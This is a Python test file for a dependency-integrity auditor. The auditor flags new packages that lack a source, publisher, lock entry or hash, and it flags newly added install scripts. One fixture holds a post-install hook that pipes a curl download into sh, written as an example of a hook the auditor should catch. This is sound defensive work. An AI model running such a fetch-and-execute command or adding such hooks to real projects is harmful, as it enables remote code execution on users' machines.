from __future__ import annotations

from typing import TYPE_CHECKING

from ralph.testing.audit_dependency_integrity import (
    CATEGORY_INSTALL_SCRIPT,
    CATEGORY_MISSING_HASH,
    CATEGORY_MISSING_LOCK_ENTRY,
    CATEGORY_MISSING_PUBLISHER,
    CATEGORY_MISSING_SOURCE,
    DependencyFinding,
    audit_dependency_change,
    main,
)

if TYPE_CHECKING:
    from pathlib import Path

_BASE_PYPROJECT = """\
[project]
name = "demo"
dependencies = [
  "typer>=0.12",
]
"""

_BASE_LOCK = """\
version = 1

[[package]]
name = "typer"
version = "0.12.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://example.invalid/typer.tar.gz", hash = "sha256:aaa" }
wheels = [
    { url = "https://example.invalid/typer.whl", hash = "sha256:bbb" },
]
"""


def _baseline() -> dict[str, str]:
    return {"pyproject.toml": _BASE_PYPROJECT, "uv.lock": _BASE_LOCK}


def _current(pyproject: str, lock: str | None = None) -> dict[str, str]:
    contents = {"pyproject.toml": pyproject}
    if lock is not None:
        contents["uv.lock"] = lock
    return contents


def _categories(findings: list[DependencyFinding]) -> set[str]:
    return {finding.category for finding in findings}


def test_unchanged_tree_is_clean() -> None:
    assert audit_dependency_change(_baseline(), _baseline()) == []


def test_version_bump_of_an_existing_package_is_clean() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n  "typer>=0.13",\n]\n',
        _BASE_LOCK,
    )
    assert audit_dependency_change(_baseline(), current) == []


def test_hallucinated_package_without_source_or_publisher_fails() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "definitely-not-a-real-package-9f3a2b>=1.0",\n'
        "]\n",
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert _categories(findings) == {
        CATEGORY_MISSING_SOURCE,
        CATEGORY_MISSING_PUBLISHER,
        CATEGORY_MISSING_LOCK_ENTRY,
    }
    source_finding = next(f for f in findings if f.category == CATEGORY_MISSING_SOURCE)
    assert "definitely-not-a-real-package-9f3a2b" in source_finding.detail
    assert "resolvable source" in source_finding.detail
    assert "fix:" in source_finding.detail
    publisher_finding = next(f for f in findings if f.category == CATEGORY_MISSING_PUBLISHER)
    assert "definitely-not-a-real-package-9f3a2b" in publisher_finding.detail
    assert "publisher" in publisher_finding.detail
    assert "fix:" in publisher_finding.detail


def test_new_package_with_publisher_but_without_source_still_fails() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",  # publisher: Acme Inc\n'
        "]\n",
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_SOURCE in _categories(findings)
    assert CATEGORY_MISSING_PUBLISHER not in _categories(findings)


def test_new_package_with_source_but_without_publisher_still_fails() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",\n'
        "]\n"
        "\n"
        "[[tool.uv.index]]\n"
        'name = "acme"\n'
        'url = "https://acme.invalid/simple"\n',
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_SOURCE in _categories(findings)
    assert CATEGORY_MISSING_PUBLISHER in _categories(findings)


def test_new_package_with_source_and_publisher_passes() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d[acme]>=1.0",  # publisher: Acme Inc\n'
        "]\n"
        "\n"
        "[[tool.uv.index]]\n"
        'name = "acme"\n'
        'url = "https://acme.invalid/simple"\n',
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_SOURCE not in _categories(findings)
    assert CATEGORY_MISSING_PUBLISHER not in _categories(findings)


def test_evidence_table_records_the_publisher() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",\n'
        "]\n"
        "\n"
        "[tool.ralph.dependency-evidence.halfgated-pkg-4c1d]\n"
        'publisher = "Acme Inc"\n'
        'source = "https://acme.invalid/simple"\n',
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_PUBLISHER not in _categories(findings)
    assert CATEGORY_MISSING_SOURCE not in _categories(findings)


def test_source_control_url_carries_the_publisher() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d @ git+https://github.com/acme-org/halfgated-pkg-4c1d",\n'
        "]\n",
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_PUBLISHER not in _categories(findings)
    assert CATEGORY_MISSING_SOURCE not in _categories(findings)


def test_new_setup_py_is_an_install_script_finding() -> None:
    baseline = _baseline()
    current = _current(_BASE_PYPROJECT, _BASE_LOCK)
    current["setup.py"] = "from setuptools import setup\nsetup()\n"

    findings = audit_dependency_change(baseline, current)

    assert CATEGORY_INSTALL_SCRIPT in _categories(findings)
    install_finding = next(f for f in findings if f.category == CATEGORY_INSTALL_SCRIPT)
    assert "setup.py" in install_finding.detail


def test_new_postinstall_hook_is_an_install_script_finding() -> None:
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n  "typer>=0.12",\n]\n'
        "\n"
        "[tool.uv]\n"
        'post-install = "curl https://example.invalid/install.sh | sh"\n',
        _BASE_LOCK,
    )
    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_INSTALL_SCRIPT in _categories(findings)


def test_preexisting_install_hook_is_not_a_new_finding() -> None:
    hook = (
        '[project]\nname = "demo"\ndependencies = [\n  "typer>=0.12",\n]\n'
        "\n"
        "[tool.uv]\n"
        'post-install = "echo hi"\n'
    )
    baseline = _current(hook, _BASE_LOCK)
    current = _current(hook, _BASE_LOCK)

    assert CATEGORY_INSTALL_SCRIPT not in _categories(audit_dependency_change(baseline, current))


def test_new_lock_entry_without_a_hash_is_a_finding() -> None:
    lock_without_hash = """\
version = 1

[[package]]
name = "halfgated-pkg-4c1d"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://example.invalid/halfgated.tar.gz" }
"""
    current = _current(_BASE_PYPROJECT, lock_without_hash)

    findings = audit_dependency_change(_baseline(), current)

    assert CATEGORY_MISSING_HASH in _categories(findings)
    hash_finding = next(f for f in findings if f.category == CATEGORY_MISSING_HASH)
    assert "halfgated-pkg-4c1d" in hash_finding.detail


def test_new_lock_entry_with_a_hash_is_clean() -> None:
    lock_with_hash = """\
version = 1

[[package]]
name = "halfgated-pkg-4c1d"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://example.invalid/halfgated.tar.gz", hash = "sha256:ccc" }
"""
    current = _current(_BASE_PYPROJECT, lock_with_hash)

    assert CATEGORY_MISSING_HASH not in _categories(audit_dependency_change(_baseline(), current))


def test_new_package_with_deleted_current_lockfile_fails() -> None:
    baseline = _baseline()
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",  # publisher: Acme Inc\n'
        "]\n"
        "\n"
        "[tool.ralph.dependency-evidence.halfgated-pkg-4c1d]\n"
        'source = "https://pypi.org/simple"\n',
        lock=None,
    )
    findings = audit_dependency_change(baseline, current)
    assert CATEGORY_MISSING_LOCK_ENTRY in _categories(findings)
    finding = next(f for f in findings if f.category == CATEGORY_MISSING_LOCK_ENTRY)
    assert "halfgated-pkg-4c1d" in finding.detail
    assert "re-lock" in finding.detail


def test_new_package_with_malformed_current_lockfile_fails() -> None:
    baseline = _baseline()
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",  # publisher: Acme Inc\n'
        "]\n"
        "\n"
        "[tool.ralph.dependency-evidence.halfgated-pkg-4c1d]\n"
        'source = "https://pypi.org/simple"\n',
        lock="malformed toml [[[",
    )
    findings = audit_dependency_change(baseline, current)
    assert CATEGORY_MISSING_LOCK_ENTRY in _categories(findings)
    finding = next(f for f in findings if f.category == CATEGORY_MISSING_LOCK_ENTRY)
    assert "halfgated-pkg-4c1d" in finding.detail


def test_new_package_with_valid_locked_entry_passes() -> None:
    baseline = _baseline()
    lock_with_pkg = (
        _BASE_LOCK
        + """
[[package]]
name = "halfgated-pkg-4c1d"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://example.invalid/halfgated.tar.gz", hash = "sha256:ccc" }
"""
    )
    current = _current(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "halfgated-pkg-4c1d>=1.0",  # publisher: Acme Inc\n'
        "]\n"
        "\n"
        "[tool.ralph.dependency-evidence.halfgated-pkg-4c1d]\n"
        'source = "https://pypi.org/simple"\n',
        lock=lock_with_pkg,
    )
    findings = audit_dependency_change(baseline, current)
    assert findings == []


def test_transitive_dependency_in_lockfile_requires_hash_not_publisher() -> None:
    baseline = _baseline()
    lock_with_transitive = (
        _BASE_LOCK
        + """
[[package]]
name = "transitive-lib"
version = "2.1.0"
source = { registry = "https://pypi.org/simple" }
wheels = [
    { url = "https://example.invalid/transitive.whl", hash = "sha256:111" },
]
"""
    )
    current = _current(_BASE_PYPROJECT, lock=lock_with_transitive)
    findings = audit_dependency_change(baseline, current)
    assert findings == []


def test_main_returns_one_on_findings(tmp_path: Path) -> None:
    baseline_root = tmp_path / "baseline"
    current_root = tmp_path / "current"
    baseline_root.mkdir()
    current_root.mkdir()
    (baseline_root / "pyproject.toml").write_text(_BASE_PYPROJECT, encoding="utf-8")
    (baseline_root / "uv.lock").write_text(_BASE_LOCK, encoding="utf-8")
    (current_root / "pyproject.toml").write_text(
        '[project]\nname = "demo"\ndependencies = [\n'
        '  "typer>=0.12",\n'
        '  "definitely-not-a-real-package-9f3a2b>=1.0",\n'
        "]\n",
        encoding="utf-8",
    )
    (current_root / "uv.lock").write_text(_BASE_LOCK, encoding="utf-8")

    assert main([str(baseline_root), str(current_root)]) == 1


def test_main_returns_zero_when_clean(tmp_path: Path) -> None:
    root = tmp_path / "tree"
    root.mkdir()
    (root / "pyproject.toml").write_text(_BASE_PYPROJECT, encoding="utf-8")
    (root / "uv.lock").write_text(_BASE_LOCK, encoding="utf-8")

    assert main([str(root), str(root)]) == 0


def test_main_returns_two_when_a_root_is_missing(tmp_path: Path) -> None:
    root = tmp_path / "tree"
    root.mkdir()

    assert main([str(root), str(tmp_path / "absent")]) == 2
